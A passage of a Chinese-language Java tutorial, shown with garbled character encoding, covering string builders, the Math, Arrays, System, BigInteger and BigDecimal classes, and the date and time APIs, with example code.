çš„æ‰§è¡Œæ—¶é—´ï¼š\" + (endTime - startTime) + \"ms\");\n\n\n        String text = \"\";\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//String æ‹¼æ¥80000\n            text = text + i;\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"String çš„æ‰§è¡Œæ—¶é—´ï¼š\" + (endTime - startTime) + \"ms\");\n    }\n}\n\n/*\nStringBuffer çš„æ‰§è¡Œæ—¶é—´ï¼š7ms\nStringBuilder çš„æ‰§è¡Œæ—¶é—´ï¼š3ms\nString çš„æ‰§è¡Œæ—¶é—´ï¼š1385ms\n*/\n```\n\n**Stringã€StringBufferã€StringBuilder çš„é€‰æ‹©**\n\n- 1.å¦‚æœå­—ç¬¦ä¸²å­˜åœ¨å¤§é‡çš„ä¿®æ”¹æ“ä½œï¼Œä¸€èˆ¬ä½¿ç”¨ StringBuffer æˆ– StringBuilder\n- 2.å¦‚æœå­—ç¬¦ä¸²å­˜åœ¨å¤§é‡çš„ä¿®æ”¹æ“ä½œï¼Œå¹¶åœ¨å•çº¿ç¨‹çš„æƒ…å†µï¼Œä½¿ç”¨ StringBuilder\n- 3.å¦‚æœå­—ç¬¦ä¸²å­˜åœ¨å¤§é‡çš„ä¿®æ”¹æ“ä½œï¼Œå¹¶åœ¨å¤šçº¿ç¨‹çš„æƒ…å†µï¼Œä½¿ç”¨ StringBuffer\n- 4.å¦‚æœæˆ‘ä»¬å­—ç¬¦ä¸²å¾ˆå°‘ä¿®æ”¹ï¼Œè¢«å¤šä¸ªå¯¹è±¡å¼•ç”¨ï¼Œä½¿ç”¨ Stringï¼Œæ¯”å¦‚é…ç½®ä¿¡æ¯ç­‰\n\n## Mathç±»\n\n- Math.abs() //ç»å¯¹å€¼\n- Math.pow() //æ±‚å¹‚\n- Math.ceil() //å‘ä¸Šå–æ•´,è¿”å›>=è¯¥å‚æ•°çš„æœ€å°æ•´æ•°\n- Math.floor() //å‘ä¸‹å–æ•´ï¼Œè¿”å›<=è¯¥å‚æ•°çš„æœ€å¤§æ•´æ•°(è½¬æˆdouble)\n- Math.round() //å››èˆäº”å…¥\n- Math.sqrt() //æ±‚å¼€æ–¹\n- Math.random() //æ±‚éšæœºæ•°,è¿”å›çš„æ˜¯ [0,1) ä¹‹é—´çš„ä¸€ä¸ªéšæœºå°æ•°\n- Math.min() //è¿”å›æœ€å°å€¼\n- Math.max() //è¿”å›æœ€å¤§å€¼\n\n```java\npackage com.jwt.math_;\n\npublic class MathMethod {\n    public static void main(String[] args) {\n        //çœ‹çœ‹Math å¸¸ç”¨çš„æ–¹æ³•(é™æ€æ–¹æ³•)\n        //1.abs ç»å¯¹å€¼\n        int abs = Math.abs(-9);\n        System.out.println(abs);//9\n        //2.pow æ±‚å¹‚\n        double pow = Math.pow(2,4);//2 çš„4 æ¬¡æ–¹\n        System.out.println(pow);//16\n        //3.ceil å‘ä¸Šå–æ•´,è¿”å›>=è¯¥å‚æ•°çš„æœ€å°æ•´æ•°(è½¬æˆdouble);\n        double ceil = Math.ceil(3.9);\n        System.out.println(ceil);//4.0\n        //4.floor å‘ä¸‹å–æ•´ï¼Œè¿”å›<=è¯¥å‚æ•°çš„æœ€å¤§æ•´æ•°(è½¬æˆdouble)\n        double floor = Math.floor(4.001);\n        System.out.println(floor);//4.0\n        //5.round å››èˆäº”å…¥\n        long round = Math.round(5.51);\n        System.out.println(round);//6\n        //6.sqrt æ±‚å¼€æ–¹\n        double sqrt = Math.sqrt(9.0);\n        System.out.println(sqrt);//3.0\n        //7.random æ±‚éšæœºæ•° random è¿”å›çš„æ˜¯ [0,1) ä¹‹é—´çš„ä¸€ä¸ªéšæœºå°æ•°\n        //1).è¿”å›çš„æ˜¯[0,1) ä¹‹é—´çš„ä¸€ä¸ªéšæœºå°æ•°\n        System.out.println(Math.random());\n        //2).è¿”å›çš„æ˜¯[0,6) ä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•´æ•°\n        System.out.println((int)(Math.random() * 6));\n        //3).è¿”å›çš„æ˜¯[2,7] ä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•´æ•°\n        //å…¬å¼:(int)(a + Math.random() * (b-a +1) )\n        System.out.println((int)(2 + Math.random() * (7 - 2 + 1)));\n        //8.max , min è¿”å›æœ€å¤§å€¼å’Œæœ€å°å€¼\n        int min = Math.min(1, 9);\n        int max = Math.max(45, 90);\n        System.out.println(\"min=\" + min);\n        System.out.println(\"max=\" + max);\n    }\n\n}\n```\n\n## Arraysç±»\n\nArrays é‡Œé¢åŒ…å«äº†ä¸€ç³»åˆ—é™æ€æ–¹æ³•ï¼Œç”¨äºç®¡ç†æˆ–æ“ä½œæ•°çµ„(æ¯”å¦‚æ’åºå’Œæœç´¢)ã€‚\n- toString() è¿”å›æ•°çµ„çš„å­—ç¬¦ä¸²å½¢å¼\n\n```java\nInteger[] integers = {1, 20, 90};\n//éå†æ•°ç»„\nfor(int i = 0; i < integers.length; i++) {\n\tSystem.out.println(integers[i]);\n}\n\n//ç›´æ¥ä½¿ç”¨Arrays.toString æ–¹æ³•ï¼Œæ˜¾ç¤ºæ•°ç»„\nSystem.out.println(Arrays.toString(integers));\n```\n\n- sort() æ’åº(é»˜è®¤æ’åºå’Œå®šåˆ¶æ’åº)\n\n```java\n//æ¼”ç¤ºsort æ–¹æ³•çš„ä½¿ç”¨\nInteger arr3[] = {1, -1, 7, 0, 89};\n//é»˜è®¤æ’åº\nArrays.sort(arr3);//é»˜è®¤å‡åº\nSystem.out.println(\"===æ’åºå===\");\nSystem.out.println(Arrays.toString(arr3));\n\n//å®šåˆ¶æ’åº\nArrays.sort(arr, new Comparator() {\n  @Override\n  public int compare(Object o1, Object o2) {\n    Integer i1 = (Integer) o1;\n    Integer i2 = (Integer) o2;\n    return i2 - i1;\n  }\n});\nSystem.out.println(\"===æ’åºå===\");\nSystem.out.println(Arrays.toString(arr));\n```\n\n- binarySearch() é€šè¾»äºŒåˆ†æœç´¢æ³•è¿›è¡ŒæŸ»æ‰¾ï¼Œè¦æ±‚å¿…é¡»å…ˆæ’å¥½åº\n\n```java\n//binarySearch é€šè¿‡äºŒåˆ†æœç´¢æ³•è¿›è¡ŒæŸ¥æ‰¾ï¼Œè¦æ±‚è¯¥æ•°ç»„æ˜¯æœ‰åºçš„. å¦‚æœè¯¥æ•°ç»„æ˜¯æ— åºçš„ï¼Œä¸èƒ½ä½¿ç”¨ã€\nInteger[] arr = {1, 2, 90, 123, 567};\nint index = Arrays.binarySearch(arr, 567);//å¦‚æœæ•°ç»„ä¸­å­˜åœ¨è¯¥å…ƒç´ ï¼Œè¿”å›è¯¥å…ƒç´ ä¸‹æ ‡\nint index2 = Arrays.binarySearch(arr, 568); //å¦‚æœä¸å­˜åœ¨è¯¥å…ƒç´ ï¼Œè¿”å› return -(low + 1);  low:è¯¥å…ƒç´ åº”è¯¥å­˜åœ¨ä½ç½®çš„ä¸‹æ ‡\nSystem.out.println(\"index=\" + index);\nSystem.out.println(\"index2=\" + index2);\n```\n\n- copyOf() æ•°ç»„å…ƒç´ å¤åˆ¶\n\n```java\n//copyOf æ•°ç»„å…ƒç´ çš„å¤åˆ¶\n//1. ä»arr æ•°ç»„ä¸­ï¼Œæ‹·è´arr.length ä¸ªå…ƒç´ åˆ°newArr æ•°ç»„ä¸­\n//2. å¦‚æœæ‹·è´çš„é•¿åº¦> arr.length å°±åœ¨æ–°æ•°ç»„çš„åé¢å¢åŠ null\n//3. å¦‚æœæ‹·è´é•¿åº¦< 0 å°±æŠ›å‡ºå¼‚å¸¸NegativeArraySizeException\n//4. è¯¥æ–¹æ³•çš„åº•å±‚ä½¿ç”¨çš„æ˜¯System.arraycopy()\nInteger[] arr = {1, 2, 90, 123, 567};\nInteger[] newArr = Arrays.copyOf(arr, arr.length);\nSystem.out.println(\"==æ‹·è´æ‰§è¡Œå®Œæ¯•å==\");\nSystem.out.println(Arrays.toString(newArr));\n```\n\n- fill()æ•°ç»„å…ƒç´ çš„å¡«å……\n\n```java\n//fill æ•°ç»„å…ƒç´ çš„å¡«å……ï¼Œå¯ä»¥ç†è§£æˆæ˜¯æ›¿æ¢åŸç†çš„å…ƒç´ \nInteger[] num = new Integer[]{9,3,2};\nArrays.fill(num, 99);\nSystem.out.println(\"==num æ•°ç»„å¡«å……å==\");\nSystem.out.println(Arrays.toString(num));\n```\n\n- equals() æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„å…ƒç´ å†…å®¹æ˜¯å¦å®Œå…¨ä¸€è‡´\n\n```java\n//equals æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„å…ƒç´ å†…å®¹æ˜¯å¦å®Œå…¨ä¸€è‡´\nInteger[] arr = {1, 2, 90, 123, 567};\nInteger[] arr2 = {1, 2, 90, 123};\n//å¦‚æœarr å’Œarr2 æ•°ç»„çš„å…ƒç´ ä¸€æ ·ï¼Œåˆ™è¿”å›true;ä¸æ˜¯å®Œå…¨ä¸€æ ·ï¼Œå°±è¿”å›false\nboolean equals = Arrays.equals(arr, arr2);\nSystem.out.println(\"equals=\" + equals);\n```\n\n- asListå°†ä¸€ç»„å€¼ï¼Œè½¬æ¢æˆlist\n\n```java\n//asList å°†ä¸€ç»„å€¼ï¼Œè½¬æ¢æˆlist\n//1. asList æ–¹æ³•ï¼Œä¼šå°†(2,3,4,5,6,1)æ•°æ®è½¬æˆä¸€ä¸ªList é›†åˆ\n//2. è¿”å›çš„asList ç¼–è¯‘ç±»å‹List(æ¥å£)\n//3. asList è¿è¡Œç±»å‹java.util.Arrays#ArrayList, æ˜¯Arrays ç±»çš„\nList asList = Arrays.asList(2,3,4,5,6,1);\nSystem.out.println(\"asList=\" + asList);\nSystem.out.println(\"asList çš„è¿è¡Œç±»å‹\" + asList.getClass());\n```\n\n**ç»ƒä¹ **\n\nè‡ªå®šä¹‰ Book ç±»ï¼Œé‡Œé¢åŒ…å« name å’Œ priceï¼Œæœ‰ 4æœ¬ä¹¦å¯¹è±¡ï¼ŒæŒ‰ price æ’åºï¼Œè¦æ±‚(1)ä»å¤§åˆ°å°(2)ä»å°åˆ°å¤§(3)æŒ‰ç…§ä¹¦åé•¿åº¦ä»å¤§åˆ°å°\n\nBook[] books = new Book[4];\nbooks[0] = new Book(\"çº¢æ¥¼æ¢¦\", 100);\nbooks[1] = new Book(\"è¥¿æ¸¸è®°\", 90);\nbooks[2] = new Book(\"é’å¹´æ–‡æ‘˜20å¹´\"ï¼Œ5);\nbooks[3] = new Book(\"javaä»å…¥é—¨åˆ°æ”¾å¼ƒ\"ï¼Œ300);\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Arrays;\nimport java.util.Comparator;\n\npublic class ArraysExercise {\n    public static void main(String[] args) {\n        Book[] books = new Book[4];\n        books[0] = new Book(\"çº¢æ¥¼æ¢¦\", 100);\n        books[1] = new Book(\"è¥¿æ¸¸è®°~\", 90);\n        books[2] = new Book(\"é’å¹´æ–‡æ‘˜20å¹´\",5);\n        books[3] = new Book(\"javaä»å…¥é—¨åˆ°æ”¾å¼ƒ\",300);\n        //(1)priceä»å¤§åˆ°å°\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                int priceVal = o2.getPrice() - o1.getPrice();\n                if(priceVal > 0) {\n                     return 1;\n                } else if(priceVal < 0) {\n                     return -1;\n                } else {\n                     return 0;\n                }\n            }\n        });\n        System.out.println(\"priceä»å¤§åˆ°å°ï¼š\" + Arrays.toString(books));\n\n        //(2)priceä»å°åˆ°å¤§\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                int priceVal = o1.getPrice() - o2.getPrice();\n                if(priceVal > 0) {\n                    return 1;\n                } else if(priceVal < 0) {\n                    return -1;\n                } else {\n                    return 0;\n                }\n            }\n        });\n        System.out.println(\"priceä»å°åˆ°å¤§ï¼š\" + Arrays.toString(books));\n        \n        //(3)ä¹¦åé•¿åº¦ä»å¤§åˆ°å°\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                return o2.getName().length() - o1.getName().length();\n            }\n        });\n        System.out.println(\"ä¹¦åé•¿åº¦ä»å¤§åˆ°å°ï¼š\" + Arrays.toString(books));\n    }\n}\n\nclass Book{\n    private String name;\n    private int price;\n\n    public Book(String name, int price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getPrice() {\n        return price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n## Systemç±»\n\n- arraycopy(src,srcPos,dest,destPos,length) ï¼šå¤åˆ¶æ•°ç»„å…ƒç´ \n  -  srcï¼šæºæ•°ç»„\n  - srcPosï¼šä»æºæ•°ç»„çš„å“ªä¸ªç´¢å¼•ä½ç½®å¼€å§‹æ‹·è´\n  - dest: ç›®æ ‡æ•°ç»„ï¼Œå³æŠŠæºæ•°ç»„çš„æ•°æ®æ‹·è´åˆ°å“ªä¸ªæ•°ç»„\n  - destPos: æŠŠæºæ•°ç»„çš„æ•°æ®æ‹·è´åˆ°ç›®æ ‡æ•°ç»„çš„å“ªä¸ªç´¢å¼•\n  - length: ä»æºæ•°ç»„æ‹·è´å¤šå°‘ä¸ªæ•°æ®åˆ°ç›®æ ‡æ•°ç»„\n- currentTimeMillens()ï¼šè¿”å›å½“å‰æ—¶é—´è·ç¦» 1970-1-1 çš„æ¯«ç§’æ•°\n- exit()ï¼šé€€å‡ºå½“å‰ç¨‹åº\n- gc()ï¼šè¿è¡Œåƒåœ¾å›æ”¶æœºåˆ¶\n\n```java\npackage com.jwt.system_;\n\nimport java.util.Arrays;\n\npublic class System_ {\n    public static void main(String[] args) {\n\n        //arraycopy ï¼šå¤åˆ¶æ•°ç»„å…ƒç´ ï¼Œæ¯”è¾ƒé€‚åˆåº•å±‚è°ƒç”¨ï¼Œ\n        // ä¸€èˆ¬ä½¿ç”¨Arrays.copyOf å®Œæˆå¤åˆ¶æ•°ç»„\n        int[] src={1,2,3};\n        int[] dest = new int[3];// dest å½“å‰æ˜¯{0,0,0}\n        System.arraycopy(src, 0, dest, 0, src.length);\n        System.out.println(\"dest=\" + Arrays.toString(dest));//[1, 2, 3]\n\n        //currentTimeMillens:è¿”å›å½“å‰æ—¶é—´è·ç¦»1970-1-1 çš„æ¯«ç§’æ•°\n        System.out.println(System.currentTimeMillis());\n\n        //exit é€€å‡ºå½“å‰ç¨‹åº\n         System.out.println(\"ok1\");\n         System.exit(0); //exit(0) è¡¨ç¤ºç¨‹åºé€€å‡º\n         System.out.println(\"ok2\");\n    }\n}\n```\n\n## BigIntegerç±»\n\nBigInteger é€‚åˆä¿å­˜æ¯”è¾ƒå¤§çš„æ•´å‹ï¼Œå½“éœ€è¦å¤„ç†å¾ˆå¤§çš„æ•´æ•°ï¼Œlong ä¸å¤Ÿç”¨å¯ä»¥ä½¿ç”¨ BigInteger çš„ç±»æ¥æå®š\n\nåœ¨å¯¹ BigInteger è¿›è¡ŒåŠ å‡ä¹˜é™¤çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œä¸èƒ½ç›´æ¥è¿›è¡Œ `+ - * /`\n\n- add() //åŠ \n- subtract() //å‡\n- multiply() //ä¹˜\n- divide() //é™¤\n\n```java\npackage com.jwt.bignum;\n\nimport java.math.BigInteger;\npublic class BigInteger_ {\n    public static void main(String[] args) {\n        // long l = 23788888899999999999999999999L;//æŠ¥é”™\n        // System.out.println(\"l=\" + l);//æŠ¥é”™\n        BigInteger bigInteger = new BigInteger(\"23788888899999999999999999999\");\n        System.out.println(bigInteger);\n\n        //åœ¨å¯¹BigInteger è¿›è¡ŒåŠ å‡ä¹˜é™¤çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œä¸èƒ½ç›´æ¥è¿›è¡Œ+ - * /\n        BigInteger bigInteger2 = new BigInteger(\"10099999999999999999999999999999999999999999999999999999999999999999999999999999999\");\n        BigInteger add = bigInteger.add(bigInteger2);\n        System.out.println(add);//åŠ \n        BigInteger subtract = bigInteger.subtract(bigInteger2);\n        System.out.println(subtract);//å‡\n        BigInteger multiply = bigInteger.multiply(bigInteger2);\n        System.out.println(multiply);//ä¹˜\n        BigInteger divide = bigInteger.divide(bigInteger2);\n        System.out.println(divide);//é™¤\n    }\n}\n}\n```\n\n## BigDecimalç±»\n\nBigDecimal é€‚åˆä¿å­˜ç²¾åº¦æ›´é«˜çš„æµ®ç‚¹å‹(å°æ•°)ï¼Œå½“æˆ‘ä»¬éœ€è¦ä¿å­˜ä¸€ä¸ªç²¾åº¦å¾ˆé«˜çš„æ•°æ—¶ï¼Œdouble ä¸å¤Ÿç”¨ï¼Œå¯ä»¥ç”¨ BigDecimal\n\n```java\npackage com.jwt.bignum;\n\nimport java.math.BigDecimal;\n\npublic class BigDecimal_ {\n    public static void main(String[] args) {\n         double d = 1999.11111111111999999999999977788d;\n         System.out.println(d);//æŸå¤±ç²¾åº¦\n         BigDecimal bigDecimal = new BigDecimal(\"1999.11111111111999999999999977788\");\n         System.out.println(bigDecimal);\n\n        //å¦‚æœå¯¹BigDecimal è¿›è¡Œè¿ç®—ï¼Œæ¯”å¦‚åŠ å‡ä¹˜é™¤ï¼Œéœ€è¦ä½¿ç”¨å¯¹åº”çš„æ–¹æ³•\n        BigDecimal bigDecimal2 = new BigDecimal(\"3\");\n        System.out.println(bigDecimal.add(bigDecimal2));//åŠ \n        System.out.println(bigDecimal.subtract(bigDecimal2));//å‡\n        System.out.println(bigDecimal.multiply(bigDecimal2));//ä¹˜\n\t\t\t\t\t//System.out.println(bigDecimal.divide(bigDecimal2));//å¯èƒ½æŠ›å‡ºå¼‚å¸¸ArithmeticException\n        //åœ¨è°ƒç”¨divide æ–¹æ³•æ—¶ï¼ŒæŒ‡å®šç²¾åº¦å³å¯. BigDecimal.ROUND_CEILING\n        //å¦‚æœæœ‰æ— é™å¾ªç¯å°æ•°ï¼Œå°±ä¼šä¿ç•™åˆ†å­çš„ç²¾åº¦\n        System.out.println(bigDecimal.divide(bigDecimal2, BigDecimal.ROUND_CEILING));//é™¤\n    }\n}\n```\n\n## æ—¥æœŸç±»\n\n### ç¬¬ä¸€ä»£æ—¥æœŸç±»-Dateç±»\n\n- Dateï¼šç²¾ç¡®åˆ°æ¯«ç§’ï¼Œä»£è¡¨ç‰¹å®šçš„ç¬é—´\n\n- SimpleDateFormat:  æ ¼å¼åŒ–å’Œè§£ææ—¥æœŸçš„å…·ä½“ç±»ã€‚å®ƒå…è®¸è¿›è¡Œæ ¼å¼åŒ–(æ—¥æœŸ->æ–‡æœ¬)ã€è§£æ(æ–‡æœ¬->æ—¥æœŸ)å’Œè§„èŒƒåŒ–\n  - SimpleDateFormat sdf = new SimpleDateFormat(æ ¼å¼);\n  - String str = sdf.format(æ—¥æœŸå¯¹è±¡); // å°†Date -> æŒ‡å®šæ ¼å¼String\n  - Date parse = sdf.parse(s);//æŠŠString -> Date\n\n```java\npackage com.jwt.date_;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class Date01 {\n    public static void main(String[] args) throws ParseException {\n        //1. è·å–å½“å‰ç³»ç»Ÿæ—¶é—´\n        //2. è¿™é‡Œçš„Date ç±»æ˜¯åœ¨java.util åŒ…\n        //3. é»˜è®¤è¾“å‡ºçš„æ—¥æœŸæ ¼å¼æ˜¯å›½å¤–çš„æ–¹å¼, å› æ­¤é€šå¸¸éœ€è¦å¯¹æ ¼å¼è¿›è¡Œè½¬æ¢\n        Date d1 = new Date(); //è·å–å½“å‰ç³»ç»Ÿæ—¶é—´\n        System.out.println(\"å½“å‰æ—¥æœŸ=\" + d1);\n        Date d2 = new Date(9234567); //é€šè¿‡æŒ‡å®šæ¯«ç§’æ•°å¾—åˆ°æ—¶é—´\n        System.out.println(\"d2=\" + d2); //è·å–æŸä¸ªæ—¶é—´å¯¹åº”çš„æ¯«ç§’æ•°\n\n        //1. åˆ›å»ºSimpleDateFormat å¯¹è±¡ï¼Œå¯ä»¥æŒ‡å®šç›¸åº”çš„æ ¼å¼\n        //2. è¿™é‡Œçš„æ ¼å¼ä½¿ç”¨çš„å­—æ¯æ˜¯è§„å®šå¥½ï¼Œä¸èƒ½ä¹±å†™\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyyå¹´MMæœˆddæ—¥ hh:mm:ss E\");\n        String format = sdf.format(d1); // format:å°†æ—¥æœŸè½¬æ¢æˆæŒ‡å®šæ ¼å¼çš„å­—ç¬¦ä¸²\n        System.out.println(\"å½“å‰æ—¥æœŸ=\" + format);\n\n        //1. å¯ä»¥æŠŠä¸€ä¸ªæ ¼å¼åŒ–çš„String è½¬æˆå¯¹åº”çš„Date\n        //2. è½¬æ¢å¾—åˆ°çš„Dateï¼Œè¿˜æ˜¯å›½å¤–çš„å½¢å¼ï¼Œå¦‚æœå¸Œæœ›æŒ‡å®šæ ¼å¼è¾“å‡ºï¼Œéœ€è¦è½¬æ¢\n        //3. åœ¨æŠŠString -> Date ï¼Œ ä½¿ç”¨çš„sdf æ ¼å¼éœ€è¦å’Œä½ ç»™çš„String çš„æ ¼å¼ä¸€æ ·ï¼Œå¦åˆ™ä¼šæŠ›å‡ºè½¬æ¢å¼‚å¸¸\n        //String s = \"1996 å¹´01 æœˆ01 æ—¥10:20:30 æ˜ŸæœŸä¸€\";//ä¼šæŠ›å‡ºè½¬æ¢å¼‚å¸¸\n        String s = \"1996å¹´01æœˆ01æ—¥ 10:20:30 æ˜ŸæœŸä¸€\";\n        Date parse = sdf.parse(s);//æŠŠString -> Date\n        System.out.println(parse);\n        System.out.println(\"parse=\" + sdf.format(parse));\n    }\n}\n```\n\n### ç¬¬äºŒä»£æ—¥æœŸç±»-Calendarç±»\n\nCalendarç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒä¸ºç‰¹å®šç¬é—´ä¸ä¸€ç»„è¯¸å¦‚ YEARã€MONTHã€DAY_OF_MONTHã€HOUR\nç­‰æ—¥å†å­—æ®µçš„è½¬æ¢æä¾›äº†ä¸€äº›æ–¹æ³•ã€‚\n\n- Calendar æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œ å¹¶ä¸”æ„é€ å™¨æ˜¯privateï¼Œå¯ä»¥é€šè¿‡getInstance() æ¥è·å–å®ä¾‹\n- Calendar æ²¡æœ‰æä¾›å¯¹åº”çš„æ ¼å¼åŒ–çš„ç±»ï¼Œå› æ­¤éœ€è¦ç¨‹åºå‘˜è‡ªå·±ç»„åˆæ¥è¾“å‡º(çµæ´»)\n- å¦‚æœæˆ‘ä»¬éœ€è¦æŒ‰ç…§ 24 å°æ—¶è¿›åˆ¶æ¥è·å–æ—¶é—´ï¼Œ Calendar.HOUR ==æ”¹æˆ=> Calendar.HOUR_OF_DAY\n\n```java\npackage com.jwt.date_;\n\nimport java.util.Calendar;\n\npublic class Calendar_ {\n    public static void main(String[] args) {\n        //1.åˆ›å»ºæ—¥å†ç±»å¯¹è±¡\n        Calendar c = Calendar.getInstance();\n        System.out.println(\"c=\" + c);\n        //2.è·å–æ—¥å†å¯¹è±¡çš„æŸä¸ªæ—¥å†å­—æ®µ\n        System.out.println(\"å¹´ï¼š\" + c.get(Calendar.YEAR));\n        System.out.println(\"æœˆï¼š\" + (c.get(Calendar.MONTH) + 1));//+1å› ä¸ºCalendar è¿”å›æœˆæ—¶å€™ï¼Œæ˜¯æŒ‰ç…§0 å¼€å§‹ç¼–å·\n        System.out.println(\"æ—¥ï¼š\" + c.get(Calendar.DAY_OF_MONTH));\n        System.out.println(\"å°æ—¶ï¼š\" + c.get(Calendar.HOUR));//12å°æ—¶åˆ¶\n        System.out.println(\"å°æ—¶ï¼š\" + c.get(Calendar.HOUR_OF_DAY));////24å°æ—¶åˆ¶\n        System.out.println(\"åˆ†é’Ÿï¼š\" + c.get(Calendar.MINUTE));\n        System.out.println(\"ç§’ï¼š\" + c.get(Calendar.SECOND));\n        //Calender æ²¡æœ‰ä¸“é—¨çš„æ ¼å¼åŒ–æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦ç¨‹åºå‘˜è‡ªå·±æ¥ç»„åˆæ˜¾ç¤º\n        System.out.println(c.get(Calendar.YEAR) + \"-\" + (c.get(Calendar.MONTH) + 1) + \"-\"\n                + c.get(Calendar.DAY_OF_MONTH) + \" \" + c.get(Calendar.HOUR_OF_DAY) + \":\"\n                + c.get(Calendar.MINUTE) + \":\" + c.get(Calendar.SECOND));\n\n    }\n\n}\n```\n\n### ç¬¬ä¸‰ä»£æ—¥æœŸç±»-LocalDateç±»\n\n**å‰é¢ä¸¤ä»£æ—¥æœŸç±»çš„ä¸è¶³åˆ†æ**\nJDK 1.0 ä¸­åŒ…å«äº†ä¸€ä¸ª java.util.Date ç±»ï¼Œä½†æ˜¯å®ƒçš„å¤§å¤šæ•°æ–¹æ³•å·²ç»åœ¨ JDK 1.1 å¼•å…¥ Calendar ç±»ä¹‹åè¢«å¼ƒç”¨äº†ã€‚è€Œ Calendar ä¹Ÿå­˜åœ¨é—®é¢˜æ˜¯: \n\n- 1)å¯å˜æ€§ï¼šåƒæ—¥æœŸå’Œæ—¶é—´è¿™æ ·çš„ç±»åº”è¯¥æ˜¯ä¸å¯å˜çš„ã€‚\n- 2)åç§»æ€§ï¼šDate ä¸­çš„å¹´ä»½æ˜¯ä» 1900 å¼€å§‹çš„ï¼Œè€Œæœˆä»½éƒ½ä»0å¼€å§‹ã€‚\n- 3)æ ¼å¼åŒ–ï¼šæ ¼å¼åŒ–åªå¯¹  Date æœ‰ç”¨ï¼ŒCalendaråˆ™ä¸è¡Œã€‚\n- 4)æ­¤å¤–ï¼Œå®ƒä»¬ä¹Ÿä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„;ä¸èƒ½å¤„ç†é—°ç§’ç­‰(æ¯éš”2å¤©ï¼Œå¤šå‡º1s)ã€‚\n\nLocalDate(æ—¥æœŸ/å¹´æœˆæ—¥)ã€LocalTime(æ—¶é—´/æ—¶åˆ†ç§’)ã€ LocalDateTime(æ—¥æœŸæ—¶é—´/å¹´æœˆæ—¥æ—¶åˆ†ç§’) JDK8åŠ å…¥\n\n- LocalDate åªåŒ…å«æ—¥æœŸï¼Œå¯ä»¥è·å–æ—¥æœŸå­—æ®µ\n- LocalTime åªåŒ…å«æ—¶é—´ï¼Œ å¯ä»¥è·å–æ—¶é—´å­—æ®µ\n- LocalDateTime åŒ…å«æ—¥æœŸ+æ—¶é—´ï¼Œå¯ä»¥è·å–æ—¥æœŸå’Œæ—¶é—´å­—æ®µ\n- DateTimeFormatter æ ¼å¼åŒ–æ—¥æœŸ\n  - Date TimeFormat dtf = DateTimeFormatter.ofPattern(æ ¼å¼);\n  - String str = dtf.format(æ—¥æœŸå¯¹è±¡);\n\n```java\npackage com.jwt.date_;\n\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\nimport java.time.LocalTime;\nimport java.time.format.DateTimeFormatter;\n\npublic class LocalDate_ {\n    public static void main(String[] args) {\n        //1. ä½¿ç”¨now() è¿”å›è¡¨ç¤ºå½“å‰æ—¥æœŸæ—¶é—´çš„å¯¹è±¡\n        LocalDate now = LocalDate.now(); //è·å–å¹´-æœˆ-æ—¥\n        LocalTime now2 = LocalTime.now();//è·å–åˆ°æ—¶:åˆ†:ç§’\n        LocalDateTime now3 = LocalDateTime.now();//è·å–å¹´-æœˆ-æ—¥Tæ—¶:åˆ†:ç§’\n        System.out.println(now);\n        System.out.println(now2);\n        System.out.println(now3);\n\n        //2. ä½¿ç”¨DateTimeFormatter å¯¹è±¡æ¥è¿›è¡Œæ ¼å¼åŒ–\n        // åˆ›å»ºDateTimeFormatter å¯¹è±¡\n        DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n        String format = dateTimeFormatter.format(now3);\n        System.out.println(\"æ ¼å¼åŒ–çš„æ—¥æœŸ=\" + format);\n        System.out.println(\"å¹´=\" + now3.getYear());\n        System.out.println(\"æœˆ=\" + now3.getMonth());\n        System.out.println(\"æœˆ=\" + now3.getMonthValue());\n        System.out.println(\"æ—¥=\" + now3.getDayOfMonth());\n        System.out.println(\"æ—¶=\" + now3.getHour());\n        System.out.println(\"åˆ†=\" + now3.getMinute());\n        System.out.println(\"ç§’=\" + now3.getSecond());\n        //æä¾›plusDays å’ŒminusMinutes æ–¹æ³•å¯ä»¥å¯¹å½“å‰æ—¶é—´è¿›è¡ŒåŠ æˆ–è€…å‡\n        //2å¤©åæ˜¯ä»€ä¹ˆæ—¶å€™ï¼Œå¹´-æœˆ-æ—¥ æ—¶:åˆ†:ç§’\n        LocalDateTime localDateTime = now3.plusDays(2);\n        System.out.println(\"2 å¤©å=\" + dateTimeFormatter.format(localDateTime));\n        //åœ¨5åˆ†é’Ÿå‰æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Œå¹´-æœˆ-æ—¥ æ—¶:åˆ†:ç§’\n        LocalDateTime localDateTime2 = now3.minusMinutes(5);\n        System.out.println(\"5 åˆ†é’Ÿå‰æ—¥æœŸ=\" + dateTimeFormatter.format(localDateTime2));\n    }\n}\n```\n\n### Instant æ—¶é—´æˆ³\n\nä»¥ Unix å…ƒå¹´ 1970-01-01 00:00:00 åˆ°æŸä¸ªæ—¶é—´ä¹‹é—´çš„æ¯«ç§’å€¼\n\nç±»ä¼¼ 